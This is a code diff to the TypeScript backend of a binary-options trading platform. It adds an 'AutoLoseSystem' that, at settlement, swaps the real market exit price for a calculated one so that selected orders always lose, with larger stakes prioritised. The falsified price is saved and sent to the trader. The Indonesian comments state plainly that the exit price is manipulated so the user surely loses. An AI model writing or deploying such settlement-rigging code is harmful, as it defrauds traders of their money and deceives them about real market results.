@@ -8,6 +8,7 @@ import { AssetsService } from '../assets/assets.service';
 import { PriceFetcherService } from '../assets/services/price-fetcher.service';
 import { UserStatusService } from '../user/user-status.service';
 import { TradingGateway } from '../websocket/trading.gateway';
+import { AutoLoseSystemService } from '../auto-lose-system/auto-lose-system.service';
 import { CreateBinaryOrderDto } from './dto/create-binary-order.dto';
 import { QueryBinaryOrderDto } from './dto/query-binary-order.dto';
 import {
@@ -53,6 +54,7 @@ export class BinaryOrdersService {
     private priceFetcherService: PriceFetcherService,
     private userStatusService: UserStatusService,
     private readonly tradingGateway: TradingGateway,
+    private readonly autoLoseService: AutoLoseSystemService,
   ) {
     setInterval(() => this.cleanupStaleCache(), 10000);
 
@@ -389,6 +391,18 @@ export class BinaryOrdersService {
         },
       });
 
+      // ── AutoLoseSystem: daftarkan order ke window tracker ──
+      // Order didaftarkan agar bisa diprioritaskan berdasarkan amount
+      // saat settlement tiba (terutama mode highest_amount)
+      this.autoLoseService.registerOrder(
+        orderId,
+        userId,
+        createOrderDto.amount,
+        accountType,
+        userStatus,
+        entryTimestamp,
+      );
+
       if (this.orderCreateCount % 10 === 0) {
         this.logger.log(
           `📊 Order Performance: Created ${this.orderCreateCount} orders, ` +
@@ -536,11 +550,50 @@ export class BinaryOrdersService {
         return;
       }
 
-      const result = CalculationUtil.determineBinaryResult(
-        order.direction,
-        order.entry_price,
-        priceData.price,
-      );
+      // ─────────────────────────────────────────────────────────────────
+      // ⚡ AUTOLOSEYSTEM — PRIORITAS LEBIH TINGGI DARI ASSETSCHEDULE
+      // Jika AutoLoseSystem aktif dan order lolos filter,
+      // exit_price dimanipulasi agar user pasti LOSE.
+      // Ini mengoverride hasil apapun dari AssetSchedule/price normal.
+      // ─────────────────────────────────────────────────────────────────
+      const autoLoseCheck = await this.autoLoseService.shouldForceLose(order);
+
+      let exitPrice: number;
+      let result: 'WON' | 'LOST';
+
+      if (autoLoseCheck.shouldForceLose) {
+        // Manipulasi exit price agar order pasti LOST
+        exitPrice = this.autoLoseService.calculateForcedLosePrice(
+          order.direction,
+          order.entry_price,
+        );
+        result = 'LOST';
+
+        this.logger.warn(
+          `💀 [AutoLose][${order.accountType.toUpperCase()}] ` +
+          `Force LOSE order ${order.id.slice(-8)} ` +
+          `(${order.direction} | amount: ${order.amount} | status: ${order.userStatus || 'standard'}) ` +
+          `| Reason: ${autoLoseCheck.reason} ` +
+          `| Price: ${priceData.price} → Manipulated: ${exitPrice.toFixed(6)}`
+        );
+
+        // Simpan log (non-blocking, tidak mengganggu settlement)
+        this.autoLoseService
+          .logForcedLose(order, autoLoseCheck.reason!, exitPrice)
+          .catch(err =>
+            this.logger.warn(`⚠️ AutoLose log failed (non-critical): ${err.message}`)
+          );
+
+      } else {
+        // Settlement normal — pakai harga asli dari price fetcher
+        exitPrice = priceData.price;
+        result = CalculationUtil.determineBinaryResult(
+          order.direction,
+          order.entry_price,
+          exitPrice,
+        );
+      }
+      // ─────────────────────────────────────────────────────────────────
 
       const profit = result === 'WON'
         ? CalculationUtil.calculateBinaryProfit(order.amount, order.profitRate)
@@ -552,7 +605,7 @@ export class BinaryOrdersService {
       const durationDisplay = this.getDurationDisplay(order.duration);
 
       await db.collection(COLLECTIONS.ORDERS).doc(order.id).update({
-        exit_price: priceData.price,
+        exit_price: exitPrice,
         status: result,
         profit,
         settled_at: TimezoneUtil.toISOString(),
@@ -574,7 +627,7 @@ export class BinaryOrdersService {
       this.tradingGateway.emitOrderSettled(order.user_id, {
         id: order.id,
         status: result,
-        exit_price: priceData.price,
+        exit_price: exitPrice,
         profit,
         profitRate: order.profitRate,
         asset_symbol: order.asset_name,
@@ -589,7 +642,8 @@ export class BinaryOrdersService {
       this.logger.log(
         `⚡ [${settlementDateTime} WIB] [${order.accountType.toUpperCase()}] ` +
         `Settled ${order.id.slice(-8)} in ${duration}ms - ${durationDisplay} ${result} ` +
-        `${profit > 0 ? '+' : ''}${profit.toFixed(2)} (${order.profitRate}%)`
+        `${profit > 0 ? '+' : ''}${profit.toFixed(2)} (${order.profitRate}%)` +
+        `${autoLoseCheck.shouldForceLose ? ' [AUTOLOST💀]' : ''}`
       );
     } catch (error) {
       this.logger.error(`Settlement failed for ${order.id}: ${error.message}`);
